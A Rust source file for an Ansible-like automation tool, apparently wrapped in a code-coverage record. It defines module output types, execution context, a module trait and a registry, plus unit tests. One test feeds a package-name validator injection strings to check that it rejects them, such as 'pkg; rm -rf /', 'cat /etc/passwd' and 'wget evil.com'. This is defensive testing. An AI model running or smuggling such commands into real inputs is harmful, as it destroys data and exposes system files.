/// Safe to run simultaneously across all hosts.\n    /// No shared state, no resource contention expected.\n    #[default]\n    FullyParallel,\n\n    /// Requires exclusive access per host.\n    /// Example: apt/yum operations that acquire package manager locks.\n    HostExclusive,\n\n    /// Network rate-limited operations.\n    /// Example: API calls to cloud providers with rate limits.\n    RateLimited {\n        /// Maximum requests per second across all hosts\n        requests_per_second: u32,\n    },\n\n    /// Requires global exclusive access.\n    /// Only one instance can run across the entire inventory.\n    /// Example: Cluster-wide configuration changes.\n    GlobalExclusive,\n}\n\n/// Represents a difference between current and desired state\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Diff {\n    /// Description of what will change\n    pub before: String,\n    /// Description of what it will change to\n    pub after: String,\n    /// Optional detailed diff (e.g., unified diff for files)\n    pub details: Option\u003cString\u003e,\n}\n\nimpl Diff {\n    pub fn new(before: impl Into\u003cString\u003e, after: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            before: before.into(),\n            after: after.into(),\n            details: None,\n        }\n    }\n\n    pub fn with_details(mut self, details: impl Into\u003cString\u003e) -\u003e Self {\n        self.details = Some(details.into());\n        self\n    }\n}\n\n/// Result of a module execution\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct ModuleOutput {\n    /// Whether the module changed anything\n    pub changed: bool,\n    /// Human-readable message about what happened\n    pub msg: String,\n    /// Status of the execution\n    pub status: ModuleStatus,\n    /// Optional diff showing what changed\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub diff: Option\u003cDiff\u003e,\n    /// Additional data returned by the module\n    #[serde(default, skip_serializing_if = \"HashMap::is_empty\")]\n    pub data: HashMap\u003cString, serde_json::Value\u003e,\n    /// Standard output (for command modules)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub stdout: Option\u003cString\u003e,\n    /// Standard error (for command modules)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub stderr: Option\u003cString\u003e,\n    /// Return code (for command modules)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub rc: Option\u003ci32\u003e,\n}\n\nimpl ModuleOutput {\n    /// Create a new successful output with no changes\n    pub fn ok(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            changed: false,\n            msg: msg.into(),\n            status: ModuleStatus::Ok,\n            diff: None,\n            data: HashMap::new(),\n            stdout: None,\n            stderr: None,\n            rc: None,\n        }\n    }\n\n    /// Create a new successful output with changes\n    pub fn changed(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            changed: true,\n            msg: msg.into(),\n            status: ModuleStatus::Changed,\n            diff: None,\n            data: HashMap::new(),\n            stdout: None,\n            stderr: None,\n            rc: None,\n        }\n    }\n\n    /// Create a failed output\n    pub fn failed(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            changed: false,\n            msg: msg.into(),\n            status: ModuleStatus::Failed,\n            diff: None,\n            data: HashMap::new(),\n            stdout: None,\n            stderr: None,\n            rc: None,\n        }\n    }\n\n    /// Create a skipped output\n    pub fn skipped(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            changed: false,\n            msg: msg.into(),\n            status: ModuleStatus::Skipped,\n            diff: None,\n            data: HashMap::new(),\n            stdout: None,\n            stderr: None,\n            rc: None,\n        }\n    }\n\n    /// Add a diff to the output\n    pub fn with_diff(mut self, diff: Diff) -\u003e Self {\n        self.diff = Some(diff);\n        self\n    }\n\n    /// Add data to the output\n    pub fn with_data(mut self, key: impl Into\u003cString\u003e, value: serde_json::Value) -\u003e Self {\n        self.data.insert(key.into(), value);\n        self\n    }\n\n    /// Add stdout/stderr/rc for command outputs\n    pub fn with_command_output(\n        mut self,\n        stdout: Option\u003cString\u003e,\n        stderr: Option\u003cString\u003e,\n        rc: Option\u003ci32\u003e,\n    ) -\u003e Self {\n        self.stdout = stdout;\n        self.stderr = stderr;\n        self.rc = rc;\n        self\n    }\n}\n\n/// Parameters passed to a module\npub type ModuleParams = HashMap\u003cString, serde_json::Value\u003e;\n\n/// Context for module execution\n#[derive(Clone)]\npub struct ModuleContext {\n    /// Whether to run in check mode (dry run)\n    pub check_mode: bool,\n    /// Whether to show diffs\n    pub diff_mode: bool,\n    /// Variables available to the module\n    pub vars: HashMap\u003cString, serde_json::Value\u003e,\n    /// Facts about the target system\n    pub facts: HashMap\u003cString, serde_json::Value\u003e,\n    /// Working directory for the module\n    pub work_dir: Option\u003cString\u003e,\n    /// Whether running with elevated privileges\n    pub r#become: bool,\n    /// Method for privilege escalation\n    pub become_method: Option\u003cString\u003e,\n    /// User to become\n    pub become_user: Option\u003cString\u003e,\n    /// Connection to use for remote operations\n    pub connection: Option\u003cArc\u003cdyn Connection + Send + Sync\u003e\u003e,\n}\n\nimpl std::fmt::Debug for ModuleContext {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        f.debug_struct(\"ModuleContext\")\n            .field(\"check_mode\", \u0026self.check_mode)\n            .field(\"diff_mode\", \u0026self.diff_mode)\n            .field(\"vars\", \u0026self.vars)\n            .field(\"facts\", \u0026self.facts)\n            .field(\"work_dir\", \u0026self.work_dir)\n            .field(\"become\", \u0026self.r#become)\n            .field(\"become_method\", \u0026self.become_method)\n            .field(\"become_user\", \u0026self.become_user)\n            .field(\n                \"connection\",\n                \u0026self.connection.as_ref().map(|c| c.identifier()),\n            )\n            .finish()\n    }\n}\n\nimpl Default for ModuleContext {\n    fn default() -\u003e Self {\n        Self {\n            check_mode: false,\n            diff_mode: false,\n            vars: HashMap::new(),\n            facts: HashMap::new(),\n            work_dir: None,\n            r#become: false,\n            become_method: None,\n            become_user: None,\n            connection: None,\n        }\n    }\n}\n\nimpl ModuleContext {\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    pub fn with_check_mode(mut self, check_mode: bool) -\u003e Self {\n        self.check_mode = check_mode;\n        self\n    }\n\n    pub fn with_diff_mode(mut self, diff_mode: bool) -\u003e Self {\n        self.diff_mode = diff_mode;\n        self\n    }\n\n    pub fn with_vars(mut self, vars: HashMap\u003cString, serde_json::Value\u003e) -\u003e Self {\n        self.vars = vars;\n        self\n    }\n\n    pub fn with_facts(mut self, facts: HashMap\u003cString, serde_json::Value\u003e) -\u003e Self {\n        self.facts = facts;\n        self\n    }\n\n    pub fn with_connection(mut self, connection: Arc\u003cdyn Connection + Send + Sync\u003e) -\u003e Self {\n        self.connection = Some(connection);\n        self\n    }\n}\n\n/// Trait that all modules must implement\npub trait Module: Send + Sync {\n    /// Returns the name of the module\n    fn name(\u0026self) -\u003e \u0026'static str;\n\n    /// Returns a description of what the module does\n    fn description(\u0026self) -\u003e \u0026'static str;\n\n    /// Returns the classification of this module for execution optimization.\n    ///\n    /// The classification determines how the executor handles this module:\n    /// - `LocalLogic`: Runs on control node only, no remote execution\n    /// - `NativeTransport`: Uses native Rust SSH/SFTP operations\n    /// - `RemoteCommand`: Executes commands on remote host (default)\n    /// - `PythonFallback`: Falls back to Ansible Python module execution\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    /// Returns parallelization hints for the executor.\n    ///\n    /// This helps the executor determine safe concurrency levels:\n    /// - `FullyParallel`: Can run on all hosts simultaneously (default)\n    /// - `HostExclusive`: Only one task per host (e.g., package managers)\n    /// - `RateLimited`: Network rate-limited operations\n    /// - `GlobalExclusive`: Only one instance across entire inventory\n    fn parallelization_hint(\u0026self) -\u003e ParallelizationHint {\n        ParallelizationHint::FullyParallel\n    }\n\n    /// Execute the module with the given parameters\n    fn execute(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext)\n        -\u003e ModuleResult\u003cModuleOutput\u003e;\n\n    /// Check what would change without making changes (for check mode)\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Default implementation just calls execute with check_mode=true\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    /// Generate a diff of what would change\n    fn diff(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        // Default implementation returns None\n        let _ = (params, context);\n        Ok(None)\n    }\n\n    /// Validate the parameters before execution\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        // Default implementation does nothing\n        let _ = params;\n        Ok(())\n    }\n\n    /// Returns the list of required parameters\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[]\n    }\n\n    /// Returns the list of optional parameters with their default values\n    fn optional_params(\u0026self) -\u003e HashMap\u003c\u0026'static str, serde_json::Value\u003e {\n        HashMap::new()\n    }\n}\n\n/// Helper trait for extracting parameters\npub trait ParamExt {\n    fn get_string(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e;\n    fn get_string_required(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cString\u003e;\n    fn get_bool(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003cbool\u003e\u003e;\n    fn get_bool_or(\u0026self, key: \u0026str, default: bool) -\u003e bool;\n    fn get_i64(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003ci64\u003e\u003e;\n    fn get_u32(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003cu32\u003e\u003e;\n    fn get_vec_string(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003cVec\u003cString\u003e\u003e\u003e;\n}\n\nimpl ParamExt for ModuleParams {\n    fn get_string(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        match self.get(key) {\n            Some(serde_json::Value::String(s)) =\u003e Ok(Some(s.clone())),\n            Some(v) =\u003e Ok(Some(v.to_string().trim_matches('\"').to_string())),\n            None =\u003e Ok(None),\n        }\n    }\n\n    fn get_string_required(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cString\u003e {\n        self.get_string(key)?\n            .ok_or_else(|| ModuleError::MissingParameter(key.to_string()))\n    }\n\n    fn get_bool(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003cbool\u003e\u003e {\n        match self.get(key) {\n            Some(serde_json::Value::Bool(b)) =\u003e Ok(Some(*b)),\n            Some(serde_json::Value::String(s)) =\u003e match s.to_lowercase().as_str() {\n                \"true\" | \"yes\" | \"1\" | \"on\" =\u003e Ok(Some(true)),\n                \"false\" | \"no\" | \"0\" | \"off\" =\u003e Ok(Some(false)),\n                _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                    \"{} must be a boolean\",\n                    key\n                ))),\n            },\n            Some(_) =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"{} must be a boolean\",\n                key\n            ))),\n            None =\u003e Ok(None),\n        }\n    }\n\n    fn get_bool_or(\u0026self, key: \u0026str, default: bool) -\u003e bool {\n        self.get_bool(key).ok().flatten().unwrap_or(default)\n    }\n\n    fn get_i64(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003ci64\u003e\u003e {\n        match self.get(key) {\n            Some(serde_json::Value::Number(n)) =\u003e n.as_i64().map(Some).ok_or_else(|| {\n                ModuleError::InvalidParameter(format!(\"{} must be an integer\", key))\n            }),\n            Some(serde_json::Value::String(s)) =\u003e s\n                .parse()\n                .map(Some)\n                .map_err(|_| ModuleError::InvalidParameter(format!(\"{} must be an integer\", key))),\n            Some(_) =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"{} must be an integer\",\n                key\n            ))),\n            None =\u003e Ok(None),\n        }\n    }\n\n    fn get_u32(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003cu32\u003e\u003e {\n        match self.get(key) {\n            Some(serde_json::Value::Number(n)) =\u003e n\n                .as_u64()\n                .and_then(|v| u32::try_from(v).ok())\n                .map(Some)\n                .ok_or_else(|| {\n                    ModuleError::InvalidParameter(format!(\"{} must be a positive integer\", key))\n                }),\n            Some(serde_json::Value::String(s)) =\u003e s.parse().map(Some).map_err(|_| {\n                ModuleError::InvalidParameter(format!(\"{} must be a positive integer\", key))\n            }),\n            Some(_) =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"{} must be a positive integer\",\n                key\n            ))),\n            None =\u003e Ok(None),\n        }\n    }\n\n    fn get_vec_string(\u0026self, key: \u0026str) -\u003e ModuleResult\u003cOption\u003cVec\u003cString\u003e\u003e\u003e {\n        match self.get(key) {\n            Some(serde_json::Value::Array(arr)) =\u003e {\n                let mut result = Vec::new();\n                for item in arr {\n                    match item {\n                        serde_json::Value::String(s) =\u003e result.push(s.clone()),\n                        v =\u003e result.push(v.to_string().trim_matches('\"').to_string()),\n                    }\n                }\n                Ok(Some(result))\n            }\n            Some(serde_json::Value::String(s)) =\u003e {\n                // Handle comma-separated string\n                Ok(Some(s.split(',').map(|s| s.trim().to_string()).collect()))\n            }\n            Some(_) =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"{} must be an array\",\n                key\n            ))),\n            None =\u003e Ok(None),\n        }\n    }\n}\n\n/// Registry for looking up modules by name\npub struct ModuleRegistry {\n    modules: HashMap\u003cString, Arc\u003cdyn Module\u003e\u003e,\n}\n\nimpl ModuleRegistry {\n    /// Create a new empty registry\n    pub fn new() -\u003e Self {\n        Self {\n            modules: HashMap::new(),\n        }\n    }\n\n    /// Create a registry with all built-in modules\n    pub fn with_builtins() -\u003e Self {\n        let mut registry = Self::new();\n        // Package management modules\n        registry.register(Arc::new(apt::AptModule));\n        registry.register(Arc::new(dnf::DnfModule));\n        registry.register(Arc::new(package::PackageModule));\n        registry.register(Arc::new(pip::PipModule));\n        registry.register(Arc::new(yum::YumModule));\n\n        // Core command modules\n        registry.register(Arc::new(command::CommandModule));\n        registry.register(Arc::new(shell::ShellModule));\n\n        // File/transport modules\n        registry.register(Arc::new(blockinfile::BlockinfileModule));\n        registry.register(Arc::new(copy::CopyModule));\n        registry.register(Arc::new(file::FileModule));\n        registry.register(Arc::new(lineinfile::LineinfileModule));\n        registry.register(Arc::new(template::TemplateModule));\n\n        // System management modules\n        registry.register(Arc::new(group::GroupModule));\n        registry.register(Arc::new(service::ServiceModule));\n        registry.register(Arc::new(user::UserModule));\n\n        // Source control modules\n        registry.register(Arc::new(git::GitModule));\n\n        // Logic/utility modules\n        registry.register(Arc::new(assert::AssertModule));\n        registry.register(Arc::new(debug::DebugModule));\n        registry.register(Arc::new(set_fact::SetFactModule));\n        registry.register(Arc::new(stat::StatModule));\n\n        // TODO: facts module needs to be converted to sync Module trait\n        // registry.register(Arc::new(facts::FactsModule));\n        registry\n    }\n\n    /// Register a module\n    pub fn register(\u0026mut self, module: Arc\u003cdyn Module\u003e) {\n        self.modules.insert(module.name().to_string(), module);\n    }\n\n    /// Get a module by name\n    pub fn get(\u0026self, name: \u0026str) -\u003e Option\u003cArc\u003cdyn Module\u003e\u003e {\n        self.modules.get(name).cloned()\n    }\n\n    /// Check if a module exists\n    pub fn contains(\u0026self, name: \u0026str) -\u003e bool {\n        self.modules.contains_key(name)\n    }\n\n    /// Get all module names\n    pub fn names(\u0026self) -\u003e Vec\u003c\u0026str\u003e {\n        self.modules.keys().map(|s| s.as_str()).collect()\n    }\n\n    /// Execute a module by name\n    pub fn execute(\n        \u0026self,\n        name: \u0026str,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let module = self\n            .get(name)\n            .ok_or_else(|| ModuleError::NotFound(name.to_string()))?;\n\n        // Validate parameters first\n        module.validate_params(params)?;\n\n        // Check required parameters\n        for param in module.required_params() {\n            if !params.contains_key(*param) {\n                return Err(ModuleError::MissingParameter((*param).to_string()));\n            }\n        }\n\n        // Execute based on mode\n        if context.check_mode {\n            module.check(params, context)\n        } else {\n            module.execute(params, context)\n        }\n    }\n}\n\nimpl Default for ModuleRegistry {\n    fn default() -\u003e Self {\n        Self::with_builtins()\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    struct TestModule;\n\n    impl Module for TestModule {\n        fn name(\u0026self) -\u003e \u0026'static str {\n            \"test\"\n        }\n\n        fn description(\u0026self) -\u003e \u0026'static str {\n            \"A test module\"\n        }\n\n        fn execute(\n            \u0026self,\n            params: \u0026ModuleParams,\n            context: \u0026ModuleContext,\n        ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n            if context.check_mode {\n                return Ok(ModuleOutput::ok(\"Would do something\"));\n            }\n\n            let msg = params\n                .get_string(\"msg\")?\n                .unwrap_or_else(|| \"Hello\".to_string());\n            Ok(ModuleOutput::changed(msg))\n        }\n\n        fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n            \u0026[]\n        }\n    }\n\n    #[test]\n    fn test_module_registry() {\n        let mut registry = ModuleRegistry::new();\n        registry.register(Arc::new(TestModule));\n\n        assert!(registry.contains(\"test\"));\n        assert!(!registry.contains(\"nonexistent\"));\n\n        let module = registry.get(\"test\").unwrap();\n        assert_eq!(module.name(), \"test\");\n    }\n\n    #[test]\n    fn test_module_output() {\n        let output = ModuleOutput::changed(\"Something changed\")\n            .with_data(\"key\", serde_json::json!(\"value\"))\n            .with_diff(Diff::new(\"old\", \"new\"));\n\n        assert!(output.changed);\n        assert_eq!(output.status, ModuleStatus::Changed);\n        assert!(output.diff.is_some());\n        assert!(output.data.contains_key(\"key\"));\n    }\n\n    #[test]\n    fn test_param_ext() {\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"string\".to_string(), serde_json::json!(\"hello\"));\n        params.insert(\"bool_true\".to_string(), serde_json::json!(true));\n        params.insert(\"bool_str\".to_string(), serde_json::json!(\"yes\"));\n        params.insert(\"number\".to_string(), serde_json::json!(42));\n        params.insert(\n            \"array\".to_string(),\n            serde_json::json!([\"one\", \"two\", \"three\"]),\n        );\n\n        assert_eq!(\n            params.get_string(\"string\").unwrap(),\n            Some(\"hello\".to_string())\n        );\n        assert_eq!(params.get_bool(\"bool_true\").unwrap(), Some(true));\n        assert_eq!(params.get_bool(\"bool_str\").unwrap(), Some(true));\n        assert_eq!(params.get_i64(\"number\").unwrap(), Some(42));\n        assert_eq!(\n            params.get_vec_string(\"array\").unwrap(),\n            Some(vec![\n                \"one\".to_string(),\n                \"two\".to_string(),\n                \"three\".to_string()\n            ])\n        );\n    }\n\n    #[test]\n    fn test_validate_package_name_valid() {\n        // Simple alphanumeric names\n        assert!(validate_package_name(\"nginx\").is_ok());\n        assert!(validate_package_name(\"python3\").is_ok());\n        assert!(validate_package_name(\"vim\").is_ok());\n\n        // Names with dots\n        assert!(validate_package_name(\"python3.11\").is_ok());\n        assert!(validate_package_name(\"libfoo.so\").is_ok());\n\n        // Names with underscores\n        assert!(validate_package_name(\"python_dev\").is_ok());\n        assert!(validate_package_name(\"lib_ssl_dev\").is_ok());\n\n        // Names with hyphens\n        assert!(validate_package_name(\"lib-dev\").is_ok());\n        assert!(validate_package_name(\"build-essential\").is_ok());\n\n        // Names with plus signs\n        assert!(validate_package_name(\"g++\").is_ok());\n        assert!(validate_package_name(\"c++\").is_ok());\n        assert!(validate_package_name(\"libstdc++\").is_ok());\n\n        // Complex combinations\n        assert!(validate_package_name(\"libssl1.1-dev\").is_ok());\n        assert!(validate_package_name(\"python3.11-venv\").is_ok());\n        assert!(validate_package_name(\"libboost1.74-dev\").is_ok());\n    }\n\n    #[test]\n    fn test_validate_package_name_invalid() {\n        // Empty name\n        assert!(validate_package_name(\"\").is_err());\n\n        // Command injection attempts\n        assert!(validate_package_name(\"pkg; rm -rf /\").is_err());\n        assert!(validate_package_name(\"pkg \u0026\u0026 cat /etc/passwd\").is_err());\n        assert!(validate_package_name(\"pkg | wget evil.com\").is_err());\n        assert!(validate_package_name(\"$(whoami)\").is_err());\n        assert!(validate_package_name(\"`id`\").is_err());\n\n        // Other invalid characters\n        assert!(validate_package_name(\"pkg name\").is_err()); // space\n        assert!(validate_package_name(\"pkg\\tname\").is_err()); // tab\n        assert!(validate_package_name(\"pkg\\nname\").is_err()); // newline\n        assert!(validate_package_name(\"pkg/name\").is_err()); // slash\n        assert!(validate_package_name(\"pkg\\\\name\").is_err()); // backslash\n        assert!(validate_package_name(\"pkg'name\").is_err()); // single quote\n        assert!(validate_package_name(\"pkg\\\"name\").is_err()); // double quote\n        assert!(validate_package_name(\"pkg\u003efile\").is_err()); // redirect\n        assert!(validate_package_name(\"pkg\u003cfile\").is_err()); // redirect\n    }\n}\n","traces":[{"line":44,"address":[32907554,32907536],"length":1,"stats":{"Line":2}},{"line":75,"address":[25447488],"length":1,"stats":{"Line":1}},{"line":76,"address":[25447515],"length":1,"stats":{"Line":1}},{"line":77,"address":[25447602],"length":1,"stats":{"Line":1}},{"line":78,"address":[25447574],"length":1,"stats":{"Line":1}},{"line":82,"address":[25447534],"length":1,"stats":{"Line":1}},{"line":83,"address":[25447687],"length":1,"stats":{"Line":1}},{"line":89,"address":[25447924],"length":1,"stats":{"Line":1}},{"line":147,"address":[25438624],"length":1,"stats":{"Line":0}},{"line":148,"address":[25438651],"length":1,"stats":{"Line":0}},{"line":149,"address":[25438682],"length":1,"stats":{"Line":0}},{"line":150,"address":[25438722],"length":1,"stats":{"Line":0}},{"line":151,"address":[25438762],"length":1,"stats":{"Line":0}},{"line":152,"address":[25438802],"length":1,"stats":{"Line":0}},{"line":187,"address":[25440592],"length":1,"stats":{"Line":0}},{"line":188,"address":[25440619],"length":1,"stats":{"Line":0}},{"line":189,"address":[25440650],"length":1,"stats":{"Line":0}},{"line":190,"address":[25440690],"length":1,"stats":{"Line":0}},{"line":191,"address":[25440730],"length":1,"stats":{"Line":0}},{"line":192,"address":[25440770],"length":1,"stats":{"Line":0}},{"line":238,"address":[32908336,32908688,32908000,32908647,32908300,32909010,32907632,32909004,32907959],"length":1,"stats":{"Line":2}},{"line":240,"address":[32908744,32908358,32907670,32908040],"length":1,"stats":{"Line":2}},{"line":241,"address":[32908443,32908121,32907755,32908825],"length":1,"stats":{"Line":2}},{"line":246,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":248,"address":[],"length":0,"stats":{"Line":0}},{"line":280,"address":[32904800,32905161,32904783,32904761,32905183,32904416],"length":1,"stats":{"Line":1}},{"line":283,"address":[32904833,32904433],"length":1,"stats":{"Line":1}},{"line":286,"address":[32904869,32904469],"length":1,"stats":{"Line":1}},{"line":294,"address":[32905945,32906329,32905984,32906351,32905967,32905584],"length":1,"stats":{"Line":2}},{"line":297,"address":[32905617,32906001],"length":1,"stats":{"Line":2}},{"line":300,"address":[32905653,32906037],"length":1,"stats":{"Line":2}},{"line":308,"address":[32905545,32905200,32905567],"length":1,"stats":{"Line":1}},{"line":311,"address":[32905217],"length":1,"stats":{"Line":1}},{"line":314,"address":[32905253],"length":1,"stats":{"Line":1}},{"line":322,"address":[32906368,32906751,32906729],"length":1,"stats":{"Line":1}},{"line":325,"address":[32906401],"length":1,"stats":{"Line":1}},{"line":328,"address":[32906437],"length":1,"stats":{"Line":1}},{"line":336,"address":[25444049,25443840],"length":1,"stats":{"Line":1}},{"line":337,"address":[25443867,25444000],"length":1,"stats":{"Line":2}},{"line":338,"address":[25444029],"length":1,"stats":{"Line":1}},{"line":342,"address":[32907088,32907066,32907360,32906768],"length":1,"stats":{"Line":1}},{"line":343,"address":[32906836,32906936,32907128,32907229],"length":1,"stats":{"Line":2}},{"line":344,"address":[32907016,32907309],"length":1,"stats":{"Line":1}},{"line":348,"address":[25443440,25443815],"length":1,"stats":{"Line":1}},{"line":354,"address":[25443496],"length":1,"stats":{"Line":1}},{"line":355,"address":[25443605],"length":1,"stats":{"Line":1}},{"line":356,"address":[25443748],"length":1,"stats":{"Line":1}},{"line":357,"address":[25443760],"length":1,"stats":{"Line":1}},{"line":388,"address":[25435264],"length":1,"stats":{"Line":0}},{"line":389,"address":[25435283],"length":1,"stats":{"Line":0}},{"line":390,"address":[25435311],"length":1,"stats":{"Line":0}},{"line":391,"address":[25435356],"length":1,"stats":{"Line":0}},{"line":392,"address":[25435396],"length":1,"stats":{"Line":0}},{"line":393,"address":[25435433],"length":1,"stats":{"Line":0}},{"line":394,"address":[25435470],"length":1,"stats":{"Line":0}},{"line":395,"address":[25435503],"length":1,"stats":{"Line":0}},{"line":396,"address":[25435543],"length":1,"stats":{"Line":0}},{"line":397,"address":[25435580],"length":1,"stats":{"Line":0}},{"line":400,"address":[32890544,32890553],"length":1,"stats":{"Line":0}},{"line":407,"address":[25439616,25439973,25439979],"length":1,"stats":{"Line":1}},{"line":411,"address":[25439633],"length":1,"stats":{"Line":1}},{"line":412,"address":[25439662],"length":1,"stats":{"Line":1}},{"line":423,"address":[25444592],"length":1,"stats":{"Line":0}},{"line":424,"address":[25444600],"length":1,"stats":{"Line":0}},{"line":427,"address":[25444336],"length":1,"stats":{"Line":1}},{"line":428,"address":[25444359],"length":1,"stats":{"Line":1}},{"line":429,"address":[25444367],"length":1,"stats":{"Line":1}},{"line":432,"address":[25444272],"length":1,"stats":{"Line":0}},{"line":433,"address":[25444295],"length":1,"stats":{"Line":0}},{"line":434,"address":[25444303],"length":1,"stats":{"Line":0}},{"line":437,"address":[25444781,25444624],"length":1,"stats":{"Line":1}},{"line":438,"address":[25444656,25444737],"length":1,"stats":{"Line":2}},{"line":439,"address":[25444761],"length":1,"stats":{"Line":1}},{"line":442,"address":[25444243,25444080],"length":1,"stats":{"Line":0}},{"line":443,"address":[25444112,25444199],"length":1,"stats":{"Line":0}},{"line":444,"address":[25444223],"length":1,"stats":{"Line":0}},{"line":447,"address":[25444564,25444400],"length":1,"stats":{"Line":0}},{"line":448,"address":[25444530,25444446],"length":1,"stats":{"Line":0}},{"line":449,"address":[25444544],"length":1,"stats":{"Line":0}},{"line":468,"address":[32198192],"length":1,"stats":{"Line":0}},{"line":469,"address":[],"length":0,"stats":{"Line":0}},{"line":479,"address":[31966752],"length":1,"stats":{"Line":0}},{"line":480,"address":[],"length":0,"stats":{"Line":0}},{"line":488,"address":[32198768,32198774,32198368],"length":1,"stats":{"Line":0}},{"line":494,"address":[32198704],"length":1,"stats":{"Line":0}},{"line":498,"address":[30747152],"length":1,"stats":{"Line":0}},{"line":500,"address":[],"length":0,"stats":{"Line":0}},{"line":501,"address":[32198314],"length":1,"stats":{"Line":0}},{"line":505,"address":[31966720],"length":1,"stats":{"Line":0}},{"line":507,"address":[],"length":0,"stats":{"Line":0}},{"line":508,"address":[31966733],"length":1,"stats":{"Line":0}},{"line":512,"address":[29068432],"length":1,"stats":{"Line":0}},{"line":513,"address":[],"length":0,"stats":{"Line":0}},{"line":517,"address":[32198208],"length":1,"stats":{"Line":0}},{"line":518,"address":[29609793],"length":1,"stats":{"Line":0}},{"line":534,"address":[31059391,31058768,31059385],"length":1,"stats":{"Line":1}},{"line":535,"address":[31058848],"length":1,"stats":{"Line":1}},{"line":536,"address":[31058991],"length":1,"stats":{"Line":1}},{"line":537,"address":[31059102],"length":1,"stats":{"Line":0}},{"line":538,"address":[31058911],"length":1,"stats":{"Line":1}},{"line":542,"address":[31060912],"length":1,"stats":{"Line":1}},{"line":543,"address":[31060963],"length":1,"stats":{"Line":1}},{"line":544,"address":[32888176,32888199],"length":1,"stats":{"Line":1}},{"line":547,"address":[31063624,31063630,31062352],"length":1,"stats":{"Line":1}},{"line":548,"address":[31062400],"length":1,"stats":{"Line":1}},{"line":549,"address":[31062790],"length":1,"stats":{"Line":1}},{"line":550,"address":[31062837,31062954],"length":1,"stats":{"Line":2}},{"line":551,"address":[31062970],"length":1,"stats":{"Line":1}},{"line":552,"address":[31063169],"length":1,"stats":{"Line":0}},{"line":553,"address":[31063363],"length":1,"stats":{"Line":0}},{"line":558,"address":[31062526],"length":1,"stats":{"Line":0}},{"line":562,"address":[31062496],"length":1,"stats":{"Line":1}},{"line":566,"address":[31059408],"length":1,"stats":{"Line":1}},{"line":567,"address":[31059448],"length":1,"stats":{"Line":1}},{"line":570,"address":[31061184],"length":1,"stats":{"Line":1}},{"line":571,"address":[31061232],"length":1,"stats":{"Line":1}},{"line":572,"address":[31061593],"length":1,"stats":{"Line":1}},{"line":573,"address":[32888489],"length":1,"stats":{"Line":0}},{"line":575,"address":[31061650],"length":1,"stats":{"Line":0}},{"line":577,"address":[31061686],"length":1,"stats":{"Line":0}},{"line":578,"address":[32888272,32888305],"length":1,"stats":{"Line":0}},{"line":579,"address":[31061364],"length":1,"stats":{"Line":0}},{"line":583,"address":[31061326],"length":1,"stats":{"Line":1}},{"line":587,"address":[31061728],"length":1,"stats":{"Line":1}},{"line":588,"address":[31061776],"length":1,"stats":{"Line":1}},{"line":589,"address":[31062129],"length":1,"stats":{"Line":1}},{"line":591,"address":[32889040,32889049],"length":1,"stats":{"Line":3}},{"line":592,"address":[31062167],"length":1,"stats":{"Line":1}},{"line":593,"address":[32888656],"length":1,"stats":{"Line":1}},{"line":594,"address":[32888681],"length":1,"stats":{"Line":0}},{"line":596,"address":[31062194],"length":1,"stats":{"Line":0}},{"line":597,"address":[32888881],"length":1,"stats":{"Line":0}},{"line":599,"address":[31061906],"length":1,"stats":{"Line":0}},{"line":603,"address":[31061870],"length":1,"stats":{"Line":1}},{"line":607,"address":[31060885,31059520,31060879],"length":1,"stats":{"Line":1}},{"line":608,"address":[31059568],"length":1,"stats":{"Line":1}},{"line":609,"address":[31060208],"length":1,"stats":{"Line":1}},{"line":610,"address":[31060233],"length":1,"stats":{"Line":1}},{"line":611,"address":[31060330,31060255],"length":1,"stats":{"Line":2}},{"line":612,"address":[31060435],"length":1,"stats":{"Line":1}},{"line":613,"address":[31060664,31060613],"length":1,"stat